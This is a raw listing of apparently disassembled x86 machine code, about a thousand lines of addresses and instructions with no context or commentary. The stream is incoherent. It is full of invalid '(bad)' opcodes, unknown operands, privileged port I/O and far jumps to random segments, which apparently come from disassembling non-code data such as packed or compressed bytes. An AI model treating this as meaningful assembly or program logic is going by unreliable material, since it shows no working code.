  420e66:	popf   
  420e67:	pusha  
  420e68:	stos   DWORD PTR es:[edi],eax
  420e69:	ja     0x420e13
  420e6b:	test   BYTE PTR [ecx],cl
  420e6d:	dec    ebp
  420e6e:	xor    BYTE PTR [ecx-0x40],0xf7
  420e72:	sub    DWORD PTR [bp-0x25c],eax
  420e77:	mov    WORD PTR ds:0x8e07475b,gs
  420e7d:	adc    esi,DWORD PTR [esi-0x4]
  420e80:	mov    ds:0xb827053f,al
  420e85:	inc    edx
  420e87:	mov    eax,0x9f185630
  420e8c:	(bad)
  420e8f:	jmp    FWORD PTR [ebp+0x3a]
  420e92:	jmp    0x4c42818c
  420e97:	retf   0x9d33
  420e9a:	sti    
  420e9b:	es imul esi,eax,0xf9008587
  420ea2:	test   eax,0x4024d091
  420ea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ea8:	lods   eax,DWORD PTR ds:[esi]
  420ea9:	out    0xa9,al
  420eab:	lea    ebp,[eax]
  420ead:	fwait
  420eae:	mov    esi,0x34030475
  420eb3:	arpl   WORD PTR [ecx],dx
  420eb5:	sub    ebp,DWORD PTR [ebx]
  420eb7:	loope  0x420ecc
  420eb9:	inc    edx
  420eba:	xchg   edi,eax
  420ebb:	loope  0x420f00
  420ebd:	sub    ah,ch
  420ebf:	test   BYTE PTR [esi],0x89
  420ec2:	outs   dx,BYTE PTR ds:[esi]
  420ec3:	inc    eax
  420ec4:	test   al,0x60
  420ec6:	push   edx
  420ec7:	pop    ebp
  420ec8:	sub    eax,0x810a7246
  420ecd:	mov    esp,0x4d740963
  420ed2:	mov    ecx,edx
  420ed4:	hlt    
  420ed5:	adc    ebx,edi
  420ed7:	stos   BYTE PTR es:[edi],al
  420ed8:	mov    ebx,DWORD PTR [ebx+0x2a]
  420edb:	cli    
  420edc:	lea    ebp,[esi]
  420ede:	pop    edi
  420edf:	xor    ecx,DWORD PTR [ebx-0x3b]
  420ee2:	jno    0x420f02
  420ee4:	mov    ebp,0x3a30e48f
  420ee9:	inc    eax
  420eea:	inc    eax
  420eeb:	je     0x420ec2
  420eed:	adc    BYTE PTR [esi],bh
  420eef:	mov    eax,0xdb6ceb12
  420ef4:	iret   
  420ef5:	pop    ds
  420ef6:	cmp    eax,0xb4363c65
  420efb:	mov    ebp,0xeb26c90a
  420f00:	stos   DWORD PTR es:[edi],eax
  420f01:	push   edx
  420f02:	imul   eax,DWORD PTR [edx+0x71],0x17a5d5cf
  420f09:	xchg   edx,eax
  420f0a:	aas    
  420f0b:	jnp    0x420ef4
  420f0d:	xor    ecx,0x4d243bb0
  420f13:	shl    BYTE PTR [ebp-0x69],1
  420f16:	inc    ebx
  420f17:	aas    
  420f18:	add    esp,esp
  420f1a:	mov    al,0x57
  420f1c:	xchg   esi,eax
  420f1d:	lock pop ebx
  420f1f:	add    dl,BYTE PTR [esi-0x7077284e]
  420f25:	idiv   BYTE PTR [ecx]
  420f27:	movaps xmm0,xmm5
  420f2a:	mov    dh,0x23
  420f2c:	loopne 0x420f51
  420f2e:	lea    esi,[ebx+0x73]
  420f31:	jb     0x420f4a
  420f33:	cli    
  420f34:	lahf   
  420f35:	lods   al,BYTE PTR ds:[esi]
  420f36:	fild   WORD PTR [ebp+0x7a26b1cd]
  420f3c:	or     BYTE PTR [esi],bl
  420f3e:	ror    DWORD PTR [ebp+0x149d94f5],cl
  420f44:	sbb    esp,DWORD PTR [eax]
  420f46:	pop    ebx
  420f47:	mov    bh,0x7
  420f49:	stos   BYTE PTR es:[edi],al
  420f4a:	sub    BYTE PTR [ebx+0x18281652],0x16
  420f51:	xchg   ecx,eax
  420f52:	mov    ds:0x1edd0805,eax
  420f57:	cmp    al,0xe7
  420f59:	cmc    
  420f5a:	dec    esi
  420f5b:	add    BYTE PTR [eax-0x47],al
  420f5e:	pop    eax
  420f5f:	sbb    eax,DWORD PTR [ebx+0x37]
  420f62:	xchg   esi,eax
  420f63:	jp     0x420fd0
  420f65:	shr    esp,cl
  420f67:	mov    bh,0xf6
  420f69:	test   DWORD PTR cs:[edx],esp
  420f6c:	(bad)  
  420f6d:	dec    edi
  420f6e:	jge    0x420fe2
  420f70:	cmp    cl,al
  420f72:	cmp    BYTE PTR [edi-0x20],dh
  420f75:	jecxz  0x420f7e
  420f77:	or     DWORD PTR [ebp-0x200b922a],ebx
  420f7d:	loop   0x420fb3
  420f7f:	push   esp
  420f80:	rcr    cl,1
  420f82:	push   0xffffff97
  420f84:	fsubp  st(6),st
  420f86:	or     al,0x60
  420f88:	jo     0x420f66
  420f8a:	mov    eax,0xe6145cf9
  420f8f:	or     edx,eax
  420f91:	aas    
  420f92:	mov    ebp,0xff0a47a1
  420f97:	jl     0x420fb0
  420f99:	sbb    cl,bl
  420f9b:	add    DWORD PTR [eax-0x21808eea],eax
  420fa1:	daa    
  420fa2:	and    al,0x2f
  420fa4:	in     eax,dx
  420fa5:	fs call ecx
  420fa8:	das    
  420fa9:	push   esi
  420faa:	add    BYTE PTR [ecx+0x2],0xdc
  420fae:	mov    esi,0xe509720e
  420fb3:	adc    DWORD PTR [edi+0xc302877],eax
  420fb9:	gs mov esi,0x13da8b9
  420fbf:	cwde   
  420fc0:	loopne 0x420f5f
  420fc2:	push   eax
  420fc3:	mov    eax,0xcc7771eb
  420fc8:	lods   al,BYTE PTR ds:[esi]
  420fc9:	or     eax,0xc318591f
  420fce:	mov    bl,0x6d
  420fd0:	push   esi
  420fd1:	pop    ecx
  420fd2:	sti    
  420fd3:	add    DWORD PTR [esi+ebx*1],ebx
  420fd6:	outs   dx,DWORD PTR ds:[esi]
  420fd7:	inc    eax
  420fd8:	add    al,0xb
  420fda:	aad    0x5a
  420fdc:	ja     0x421019
  420fde:	in     eax,dx
  420fdf:	scas   al,BYTE PTR es:[edi]
  420fe0:	add    al,0x2e
  420fe2:	icebp  
  420fe3:	add    DWORD PTR [esi-0x2f],ebp
  420fe6:	adc    ebp,DWORD PTR [eax+esi*8]
  420fe9:	sahf   
  420fea:	and    ch,0x9f
  420fed:	dec    esp
  420fee:	inc    edi
  420fef:	sbb    al,BYTE PTR [eax+0x7cb68538]
  420ff5:	dec    ebp
  420ff6:	not    DWORD PTR [edx-0x22e3b02f]
  420ffc:	add    edx,DWORD PTR [edx+0x53d3fd71]
  421002:	out    dx,al
  421003:	lock pushf 
  421005:	repz sub al,0xb7
  421008:	pop    esp
  421009:	xchg   dx,ax
  42100b:	mov    dl,0xcc
  42100d:	mov    esi,0x7798cd40
  421012:	xchg   dl,bh
  421014:	ss jmp 0x420fe5
  421017:	push   0x9e9cd22b
  42101c:	(bad)  
  42101d:	fadd   DWORD PTR [ebx-0xa]
  421020:	cs scas al,BYTE PTR es:[edi]
  421022:	sub    BYTE PTR [ecx-0x399588cc],0x22
  421029:	shl    BYTE PTR [esp+eiz*4-0x7b],cl
  42102d:	pop    edi
  42102e:	sbb    esp,DWORD PTR [ebx-0x61]
  421031:	jp     0x420ffe
  421033:	pop    ebx
  421034:	add    BYTE PTR [eax-0x2aab8173],0x8a
  42103b:	cmp    esi,esp
  42103d:	and    al,0x83
  42103f:	ja     0x421087
  421041:	inc    esp
  421042:	xchg   edi,eax
  421043:	ror    bh,cl
  421045:	lods   eax,DWORD PTR ds:[esi]
  421046:	and    DWORD PTR [esi+0x2c],ecx
  421049:	dec    ecx
  42104a:	mov    edx,0xbe198f2a
  42104f:	push   ss
  421050:	lahf   
  421051:	pop    esp
  421052:	fs xchg edi,eax
  421054:	nop
  421055:	lock ret 
  421057:	ins    DWORD PTR es:[edi],dx
  421058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421059:	lods   eax,DWORD PTR ds:[esi]
  42105a:	ror    BYTE PTR [ebp-0xebbb8f4],cl
  421060:	retf   0xa7d9
  421063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421064:	(bad)  
  421065:	(bad)  
  421066:	pop    edx
  421067:	xor    al,0xca
  421069:	push   ss
  42106a:	test   al,0xfb
  42106c:	aas    
  42106d:	pop    eax
  42106e:	dec    ebx
  42106f:	xor    bl,BYTE PTR [eiz*1+0x47d1bc63]
  421076:	adc    BYTE PTR [ebx],ch
  421078:	cmp    eax,0xfd5d6575
  42107d:	xor    eax,0xd2fc91dd
  421082:	mov    ss,WORD PTR [ebp+0x3e]
  421085:	lods   eax,DWORD PTR ds:[esi]
  421086:	inc    edx
  421087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421088:	icebp  
  421089:	pop    esp
  42108a:	sbb    al,0x61
  42108c:	mov    ebp,0xc4ace52a
  421091:	dec    eax
  421092:	in     eax,dx
  421093:	cli    
  421094:	fidivr WORD PTR [ebx-0x4f009538]
  42109a:	jnp    0x421050
  42109c:	mov    ebp,esi
  42109e:	dec    ecx
  42109f:	cmp    edi,DWORD PTR [ebp-0x47]
  4210a2:	push   es
  4210a3:	pop    esp
  4210a4:	pusha  
  4210a5:	cwde   
  4210a6:	xor    al,0x68
  4210a8:	cmp    DWORD PTR [ebx+edx*1],esp
  4210ab:	popa   
  4210ac:	repz loopne 0x421034
  4210af:	jecxz  0x42103f
  4210b1:	jno    0x421118
  4210b3:	cmp    DWORD PTR [ecx-0x51],ecx
  4210b6:	ret    0x7c13
  4210b9:	pop    ds
  4210ba:	std    
  4210bb:	imul   ebp,ebp,0xffffffa0
  4210be:	dec    esp
  4210bf:	cdq    
  4210c0:	inc    ecx
  4210c1:	ds push 0xffffffbd
  4210c4:	push   ds
  4210c5:	ret    
  4210c6:	lahf   
  4210c7:	in     eax,0xfe
  4210c9:	je     0x421073
  4210cb:	fidiv  DWORD PTR [eax+0x1b35662c]
  4210d1:	int    0x5e
  4210d3:	push   ds
  4210d4:	or     eax,0xcde70122
  4210d9:	inc    bx
  4210db:	rcr    DWORD PTR [eax-0x7c],1
  4210de:	in     al,dx
  4210df:	sub    DWORD PTR [esi],ecx
  4210e1:	jns    0x421156
  4210e3:	sbb    eax,0x366721
  4210e8:	rcr    BYTE PTR [esi+0x51],cl
  4210eb:	jl     0x421151
  4210ed:	daa    
  4210ee:	dec    edi
  4210ef:	push   es
  4210f0:	xor    eax,0x44ebf451
  4210f5:	cmp    eax,0xc2eb82a9
  4210fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210fb:	rcr    DWORD PTR [eax-0x24],1
  4210fe:	push   ebp
  4210ff:	adc    eax,0x2112194d
  421104:	and    BYTE PTR [ebx-0x8eb7df0],bl
  42110a:	arpl   WORD PTR [edi-0x1be4f2c2],sp
  421110:	mov    al,ds:0xaf5094d6
  421115:	les    edi,FWORD PTR [edx]
  421117:	std    
  421118:	rcr    BYTE PTR [esi+0x69],1
  42111b:	adc    DWORD PTR [eax-0x5],edx
  42111e:	xchg   ecx,eax
  42111f:	jp     0x4210c4
  421121:	js     0x421165
  421123:	test   ebp,ebp
  421125:	fisub  DWORD PTR [ebx+0x27]
  421128:	mov    dh,0xac
  42112a:	xchg   DWORD PTR [ebx+0x22],ebx
  42112d:	pop    esi
  42112e:	fwait
  42112f:	(bad)  
  421130:	fmul   st,st(6)
  421132:	fyl2xp1 
  421134:	xor    DWORD PTR [ecx+0x44],eax
  421137:	or     DWORD PTR [ebx+0x33daaffd],ecx
  42113d:	or     ebp,DWORD PTR [edi-0x49]
  421140:	into   
  421141:	in     eax,0x39
  421143:	pushf  
  421144:	mov    edx,0xa52870cf
  421149:	mov    esi,0x66e1f57e
  42114e:	in     eax,0x62
  421150:	data16 adc al,0x33
  421153:	lock mov ds:0x3cc8149b,eax
  421159:	jmp    0x421161
  42115b:	nop
  42115c:	stos   DWORD PTR es:[edi],eax
  42115d:	pop    ebx
  42115e:	mov    al,ds:0x8479b2a7
  421163:	inc    esi
  421164:	dec    esp
  421165:	aad    0xe7
  421167:	dec    edx
  421168:	xchg   DWORD PTR [edx-0x19b7bb85],eax
  42116e:	dec    esp
  42116f:	es ret 
  421171:	clc    
  421172:	in     eax,0xc7
  421174:	jmp    0x1936:0xd6b6aa48
  42117b:	or     dh,BYTE PTR [ecx+esi*1+0x67]
  42117f:	lods   eax,DWORD PTR ds:[esi]
  421180:	into   
  421181:	push   edi
  421182:	or     DWORD PTR [ebp-0x35],0x5cd8d02c
  421189:	ds call 0xef34:0x73153b51
  421191:	loope  0x421135
  421193:	mov    al,0x4a
  421195:	xchg   esp,eax
  421196:	mov    edx,0x7d7844a3
  42119b:	data16 shl dl,1
  42119e:	and    dl,BYTE PTR [ebp+ebx*1-0xb032052]
  4211a5:	lods   eax,DWORD PTR ds:[esi]
  4211a6:	sbb    DWORD PTR [eax],ebx
  4211a8:	lods   al,BYTE PTR ds:[esi]
  4211a9:	mov    dl,dl
  4211ab:	aad    0x12
  4211ad:	rcl    BYTE PTR [edi],1
  4211af:	je     0x421194
  4211b1:	and    DWORD PTR [eax],edx
  4211b3:	inc    ecx
  4211b4:	jbe    0x421171
  4211b6:	push   ss
  4211b7:	sub    DWORD PTR [edi-0x75],ebp
  4211ba:	mov    bl,0xe9
  4211bc:	dec    esi
  4211bd:	adc    cl,BYTE PTR [ebp+0x47f635c1]
  4211c3:	sub    al,0xee
  4211c5:	test   DWORD PTR [ebp+0x486b8099],0xce949e13
  4211cf:	xlat   BYTE PTR ds:[ebx]
  4211d0:	and    esp,DWORD PTR [ebp+0x720b2663]
  4211d6:	popa   
  4211d7:	mov    edx,0x63954bf7
  4211dc:	pop    eax
  4211dd:	mov    esp,0x59a0603
  4211e2:	cmp    DWORD PTR [esi+0x17d5c04e],ebp
  4211e8:	sbb    eax,0xce26496
  4211ed:	dec    ecx
  4211ee:	imul   esi,DWORD PTR ss:[esi-0x1e279116],0x2b313b86
  4211f9:	dec    ebp
  4211fa:	sub    ch,BYTE PTR [ebx]
  4211fc:	sbb    bl,BYTE PTR [ebx]
  4211fe:	jb     0x421273
  421200:	add    eax,0x81d33900
  421205:	iret   
  421206:	(bad)  
  421207:	ror    ebx,cl
  421209:	js     0x42118c
  42120b:	out    dx,al
  42120c:	push   edi
  42120d:	loop   0x4211f7
  42120f:	arpl   cx,si
  421211:	stos   BYTE PTR es:[edi],al
  421212:	or     al,0x99
  421214:	mov    esp,0xa820aa16
  421219:	jnp    0x4211ea
  42121b:	push   ebp
  42121c:	stos   DWORD PTR es:[edi],eax
  42121d:	in     eax,0x4e
  42121f:	sub    ecx,0xffffffed
  421222:	mov    edx,0x2815baf
  421227:	lds    ebp,FWORD PTR [edx]
  421229:	mov    esp,0x392a4038
  42122e:	dec    esp
  42122f:	dec    esp
  421230:	arpl   cx,sp
  421232:	rcl    DWORD PTR [eax-0x76fa39d2],1
  421238:	je     0x4212b8
  42123a:	or     al,0x6f
  42123c:	mov    ebx,0x1d87bde8
  421241:	and    DWORD PTR [edi],edi
  421243:	add    ebx,edx
  421245:	inc    ebp
  421246:	pop    ebx
  421247:	nop
  421248:	mov    cl,0xc9
  42124a:	scas   al,BYTE PTR es:[edi]
  42124b:	mov    ?,edx
  42124d:	arpl   WORD PTR [ebp+eax*4-0x1e],ax
  421251:	in     al,0xce
  421253:	pop    ecx
  421254:	fstp   QWORD PTR [ebx-0x3e]
  421257:	pop    esi
  421258:	lea    esp,[ebp-0x2aef30be]
  42125e:	nop
  42125f:	stos   BYTE PTR es:[edi],al
  421260:	fmul   QWORD PTR [ebp-0x1f]
  421263:	dec    edx
  421264:	jns    0x421203
  421266:	cmc    
  421267:	out    dx,eax
  421268:	dec    edi
  421269:	mov    ecx,0x801e8c4c
  42126e:	cli    
  42126f:	fcomi  st,st(5)
  421271:	and    DWORD PTR [ebx-0x4d],0xffffffbe
  421275:	mov    DWORD PTR [eax-0xba6513d],ebx
  42127b:	adc    dl,BYTE PTR [edx-0x24fc5ed0]
  421281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421282:	sbb    al,BYTE PTR [esi]
  421284:	mov    cl,0xea
  421286:	enter  0xc34a,0xbe
  42128a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42128b:	push   ebx
  42128c:	les    ecx,FWORD PTR [esi]
  42128e:	xor    al,0xac
  421291:	aaa    
  421292:	inc    esi
  421293:	mov    ecx,0x34853332
  421298:	push   es
  421299:	dec    esp
  42129a:	pop    esi
  42129b:	dec    eax
  42129c:	push   esp
  42129d:	push   esi
  42129e:	fbstp  TBYTE PTR [edi+0x23667888]
  4212a4:	out    0x33,eax
  4212a6:	imul   eax,DWORD PTR [edx],0x9473c79a
  4212ac:	xor    al,0x5d
  4212ae:	or     al,0x24
  4212b0:	xor    DWORD PTR [edx+esi*4-0x61529aad],ebx
  4212b7:	paddusw mm3,QWORD PTR [edi]
  4212ba:	mov    WORD PTR [ebx-0x13],?
  4212bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212be:	ss das 
  4212c0:	test   eax,0xe3dd342e
  4212c5:	ret    0xb486
  4212c8:	ror    DWORD PTR [edx+0x60],cl
  4212cb:	sub    DWORD PTR [edx+0x4e],ecx
  4212ce:	fld    DWORD PTR ds:0xfd93385d
  4212d4:	pop    DWORD PTR [eax]
  4212d6:	lock js 0x4212a8
  4212d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212da:	(bad)  
  4212db:	rcl    BYTE PTR [edx],cl
  4212dd:	cdq    
  4212de:	add    al,0xf8
  4212e0:	dec    ecx
  4212e1:	daa    
  4212e2:	and    ch,BYTE PTR [eax+0xa6c0302]
  4212e8:	xchg   ebx,edi
  4212ea:	ins    DWORD PTR es:[edi],dx
  4212eb:	fst    st(2)
  4212ed:	xlat   BYTE PTR ds:[ebx]
  4212ee:	cmp    dh,al
  4212f0:	push   ecx
  4212f1:	mov    ebx,0x1d07cee6
  4212f6:	xor    ecx,DWORD PTR [edx-0x10]
  4212f9:	sub    BYTE PTR [eax],cl
  4212fb:	pop    edi
  4212fc:	je     0x421355
  4212fe:	mov    ds:0x58a4124,eax
  421303:	out    0xc5,eax
  421305:	jnp    0x42134b
  421307:	scas   eax,DWORD PTR es:[edi]
  421308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421309:	mov    bl,0x8b
  42130b:	retf   0xac6e
  42130e:	mov    ebx,0x6ac88b14
  421313:	arpl   cx,bp
  421315:	dec    esp
  421316:	lea    eax,[esi-0x57637925]
  42131c:	push   ecx
  42131d:	aam    0xa
  42131f:	stos   DWORD PTR es:[edi],eax
  421320:	sub    edi,DWORD PTR [edi+ebx*4+0x17]
  421324:	sti    
  421325:	mov    ecx,0xd9fddada
  42132a:	cmp    dh,BYTE PTR [ecx+0x21]
  42132d:	and    al,0x8c
  42132f:	inc    ecx
  421330:	test   eax,0x70bcd7e6
  421335:	jmp    0xdd893551
  42133a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42133b:	outs   dx,BYTE PTR ds:[esi]
  42133c:	ja     0x4212f0
  42133e:	in     eax,dx
  42133f:	add    eax,0x27cfa4f5
  421344:	or     eax,0x82fe95a8
  421349:	xor    edx,esi
  42134b:	das    
  42134c:	dec    edx
  42134d:	ins    DWORD PTR es:[edi],dx
  42134e:	lods   eax,DWORD PTR ds:[esi]
  42134f:	mov    ebp,0xdfa7431c
  421354:	cmp    DWORD PTR [eax],ecx
  421356:	mov    al,ds:0xf4b18efb
  42135b:	imul   esp,edx,0x19
  42135e:	add    eax,0x81b09351
  421363:	cs mov ecx,0xec9e11bf
  421369:	not    DWORD PTR [esi]
  42136b:	sahf   
  42136c:	cmc    
  42136d:	arpl   si,di
  42136f:	mov    BYTE PTR [esi],dl
  421371:	das    
  421372:	adc    al,dh
  421374:	xchg   ebx,eax
  421375:	stos   BYTE PTR es:[edi],al
  421376:	sub    cx,WORD PTR [edi+0x61]
  42137a:	or     dh,BYTE PTR [ebx-0x30a466c]
  421380:	fisttp WORD PTR [eax+0x5e35aa7]
  421386:	fild   DWORD PTR [eax+ebx*8-0x7]
  42138a:	push   eax
  42138b:	inc    edi
  42138c:	imul   ebx,DWORD PTR [edi],0xfffffff9
  42138f:	or     al,0xab
  421391:	lds    esp,FWORD PTR [eiz*2+0xd559bd5]
  421398:	cmc    
  421399:	pop    ecx
  42139a:	xor    eax,0x1f557afe
  42139f:	out    0x1f,al
  4213a1:	icebp  
  4213a2:	xchg   ebp,esi
  4213a4:	in     al,dx
  4213a5:	call   0x64a0:0x2de1f1ee
  4213ac:	pop    ds
  4213ad:	push   ds
  4213ae:	jl     0x4213ac
  4213b0:	cmp    al,0x2e
  4213b2:	xchg   esi,eax
  4213b3:	dec    eax
  4213b4:	dec    ecx
  4213b5:	pop    ebp
  4213b6:	inc    ebx
  4213b7:	push   DWORD PTR [edi+eiz*1+0x2eb8c89]
  4213be:	test   al,0xf4
  4213c0:	aaa    
  4213c1:	stos   BYTE PTR es:[edi],al
  4213c2:	push   es
  4213c3:	or     eax,0x9e0964ac
  4213c8:	xchg   esi,eax
  4213c9:	daa    
  4213ca:	adc    eax,DWORD PTR [ebp-0x7660db47]
  4213d0:	and    BYTE PTR [edi-0x53fb8042],bh
  4213d6:	mov    ds:0xeaf70cb8,al
  4213db:	inc    ebx
  4213dc:	sbb    BYTE PTR [esp+eax*1],cl
  4213df:	fst    QWORD PTR [edi]
  4213e1:	das    
  4213e2:	pop    eax
  4213e3:	retf   
  4213e4:	mov    BYTE PTR [eax+0x7f088003],al
  4213ea:	jecxz  0x42142d
  4213ec:	xor    BYTE PTR [ecx-0x2a1652cd],al
  4213f2:	adc    al,0x15
  4213f4:	jge    0x4213ac
  4213f6:	in     eax,dx
  4213f7:	cmp    dl,ch
  4213f9:	ja     0x421453
  4213fb:	cmp    al,0x3c
  4213fd:	mov    ah,0xda
  4213ff:	(bad)  
  421400:	mov    bh,0x1b
  421402:	mov    eax,ds:0x1ec4eba0
  421407:	sub    BYTE PTR [ecx],al
  421409:	out    0xc5,al
  42140b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42140c:	or     DWORD PTR [ebx],edi
  42140e:	ror    bh,0x5b
  421411:	sub    ecx,ecx
  421413:	outs   dx,DWORD PTR ds:[esi]
  421414:	rol    DWORD PTR [ebx+0x55],cl
  421417:	loop   0x421494
  421419:	inc    ecx
  42141a:	or     ebp,DWORD PTR [edx]
  42141c:	inc    edi
  42141d:	(bad)  
  42141e:	sbb    dh,0xdf
  421421:	iret   
  421422:	call   DWORD PTR [eax]
  421424:	pop    ecx
  421425:	xor    cl,BYTE PTR [ebp+0x23]
  421428:	retf   0x6bac
  42142b:	aaa    
  42142c:	sub    BYTE PTR [esi+0xe25e230],bh
  421432:	jb     0x421451
  421434:	add    edi,DWORD PTR [edx]
  421436:	(bad)  
  421437:	jge    0x4213f0
  421439:	scas   eax,DWORD PTR es:[edi]
  42143a:	dec    esp
  42143b:	std    
  42143c:	cli    
  42143d:	adc    eax,0x3b72d025
  421442:	add    al,0x67
  421444:	mov    ecx,0x23b9af1d
  421449:	dec    esp
  42144a:	(bad)  
  42144b:	leave  
  42144c:	cs mov bh,ch
  42144f:	jge    0x4213d4
  421451:	call   0x52d4:0x7317f73
  421458:	repz cs retf 
  42145b:	mov    eax,0x25ae0b74
  421460:	xor    al,0xbe
  421462:	mov    eax,?
  421464:	sti    
  421465:	aas    
  421466:	add    DWORD PTR [eax-0x3cca7421],edi
  42146c:	bound  edx,QWORD PTR [ecx+0x69e73578]
  421472:	shl    BYTE PTR [ecx+ebx*2+0x477f3637],1
  421479:	mov    ebp,0xeb695d06
  42147e:	out    0x3,al
  421480:	or     BYTE PTR [edi-0x54d6a18e],0x2c
  421487:	xchg   ecx,eax
  421488:	ss loopne 0x4214bf
  42148b:	fsubp  st(4),st
  42148d:	aam    0xac
  42148f:	xchg   edi,eax
  421490:	mov    cs,WORD PTR [ebp-0x4]
  421493:	mov    ecx,DWORD PTR [eax-0x54]
  421496:	out    0x82,eax
  421498:	nop
  421499:	out    0xc9,eax
  42149b:	dec    esi
  42149c:	arpl   ax,bx
  42149e:	push   es
  42149f:	aam    0x81
  4214a1:	jg     0x42150b
  4214a3:	mov    ecx,?
  4214a5:	jnp    0x4214d9
  4214a7:	jb     0x4214a9
  4214a9:	jb     0x4214e0
  4214ab:	pop    es
  4214ac:	jle    0x42151d
  4214ae:	(bad)  
  4214af:	xor    eax,0x493a3e14
  4214b4:	cmp    al,0x8b
  4214b6:	pop    ds
  4214b7:	scas   eax,DWORD PTR es:[edi]
  4214b8:	pushf  
  4214b9:	mov    edx,0xbf67d6ed
  4214be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214bf:	daa    
  4214c0:	mov    edi,0xee67d1c7
  4214c5:	retf   
  4214c6:	mov    fs,esp
  4214c8:	adc    DWORD PTR [eax-0x5c980fb8],esp
  4214ce:	call   0x86aa:0xcc5c0767
  4214d5:	iret   
  4214d6:	cmp    ebp,ecx
  4214d8:	addr16 in eax,0x2b
  4214db:	loop   0x4214d5
  4214dd:	in     eax,dx
  4214de:	xor    ecx,DWORD PTR [edi+ebp*1]
  4214e1:	push   ecx
  4214e2:	mov    ch,0xb8
  4214e4:	sbb    bh,cl
  4214e6:	xor    eax,0x9080308b
  4214eb:	pop    ecx
  4214ec:	mov    WORD PTR [ebx-0x2a],ss
  4214ef:	call   0xf68:0x76648d37
  4214f6:	shr    BYTE PTR [ebx-0x3],1
  4214f9:	in     al,0xa2
  4214fb:	xchg   ecx,eax
  4214fc:	fldcw  WORD PTR [esi]
  4214fe:	clc    
  4214ff:	pop    eax
  421500:	shl    DWORD PTR [ebp+0x34],cl
  421503:	jno    0x42156f
  421505:	add    esi,DWORD PTR [edx+eiz*1]
  421508:	icebp  
  421509:	push   DWORD PTR [eax-0x3b]
  42150c:	add    al,0xf5
  42150e:	in     eax,dx
  42150f:	hlt    
  421510:	clc    
  421511:	in     al,0x42
  421513:	loope  0x421499
  421515:	add    DWORD PTR [ebp-0x6d9f332b],ecx
  42151b:	outs   dx,DWORD PTR ds:[esi]
  42151c:	pop    eax
  42151d:	popf   
  42151e:	lods   eax,DWORD PTR es:[esi]
  421520:	xchg   BYTE PTR [edi+eiz*4+0x34],ah
  421524:	xor    eax,0x2fd7bdff
  421529:	fs js  0x421544
  42152c:	rcl    BYTE PTR ds:0x7a45c106,0xfa
  421533:	sbb    ch,0xb5
  421536:	popf   
  421537:	xor    DWORD PTR [esp+esi*2+0x7b82e294],esi
  42153e:	mov    ebx,0xd2a319a6
  421543:	call   0x9465:0x71624649
  42154a:	and    esi,ebx
  42154c:	test   al,0xb3
  42154e:	loopne 0x4214d8
  421550:	push   esp
  421551:	ret    0x6a9
  421554:	scas   al,BYTE PTR es:[edi]
  421555:	mov    al,0x97
  421557:	adc    BYTE PTR [esi-0x1],ch
  42155a:	fdiv   QWORD PTR [ecx+eiz*8]
  42155d:	jno    0x4215a4
  42155f:	sbb    cl,BYTE PTR [ebp-0x68]
  421562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421563:	xor    al,0x61
  421565:	push   edi
  421566:	jb     0x4214fc
  421568:	push   edi
  421569:	add    al,0xc7
  42156b:	(bad)  
  42156c:	sti    
  42156d:	push   cs
  42156e:	xor    BYTE PTR [edi+0x24],bh
  421571:	gs dec edi
  421573:	jecxz  0x42153a
  421575:	dec    ecx
  421576:	mov    eax,ds:0xb21ee590
  42157b:	aad    0xee
  42157d:	pop    ecx
  42157e:	xchg   edx,eax
  42157f:	popf   
  421580:	mov    ds:0xb02787bb,al
  421585:	clc    
  421586:	push   edx
  421587:	ret    0x5253
  42158a:	add    al,0xc7
  42158c:	je     0x42158c
  42158e:	out    0xe2,al
  421590:	call   0x8e05:0x8d23c65f
  421597:	xor    DWORD PTR [ecx+0x72],ebx
  42159a:	push   eax
  42159b:	add    eax,0x7a0ae645
  4215a0:	push   cs
  4215a1:	add    BYTE PTR [eax],0xf7
  4215a4:	jmp    0x48ad:0xfb13dd2f
  4215ab:	ret    
  4215ac:	adc    al,0x2d
  4215ae:	xor    BYTE PTR [esi+eiz*1],ch
  4215b1:	sbb    ah,BYTE PTR [ecx]
  4215b3:	push   ebp
  4215b4:	std    
  4215b5:	dec    ebx
  4215b6:	and    BYTE PTR [bp+di+0x1f],0x75
  4215bb:	mov    dh,0x73
  4215bd:	and    dh,BYTE PTR [ecx+0x44d5fbbf]
  4215c3:	mov    ss,WORD PTR ds:0xb0fdfcc
  4215c9:	xor    DWORD PTR ds:0xde321745,edx
  4215cf:	cmp    DWORD PTR [edx-0x3a6057e2],0x0
  4215d6:	cmp    BYTE PTR [eax-0x2],0x40
  4215da:	div    BYTE PTR [eax+0x6b4ad3b7]
  4215e0:	cmp    esp,edi
  4215e2:	and    ebx,DWORD PTR [esi-0x74d3476a]
  4215e8:	sbb    bh,BYTE PTR [edi-0x3fc2cacf]
  4215ee:	mov    cl,0x87
  4215f0:	push   esi
  4215f1:	pop    ebp
  4215f2:	fistp  QWORD PTR [edi+edx*8]
  4215f5:	pop    ds
  4215f6:	cld    
  4215f7:	scas   al,BYTE PTR es:[edi]
  4215f8:	xchg   DWORD PTR [eax+ebx*4+0x5],edx
  4215fc:	mov    edi,0xdf67af3c
  421601:	inc    ebx
  421602:	(bad)  
  421603:	aad    0xcd
  421605:	in     eax,dx
  421606:	jmp    0x4215bd
  421608:	mov    eax,ds:0x814e4c93
  42160d:	add    ebp,0x5a623b39
  421613:	std    
  421614:	je     0x4215b6
  421616:	aas    
  421617:	xor    ch,bh
  421619:	cmp    eax,0x244fdc46
  42161e:	(bad)  [esi+eax*8-0x7b]
  421622:	mov    dh,0x45
  421624:	lods   eax,DWORD PTR ds:[esi]
  421625:	into   
  421626:	iret   
  421627:	push   edx
  421629:	pop    ebx
  42162a:	or     esp,eax
  42162c:	sbb    dl,0xa
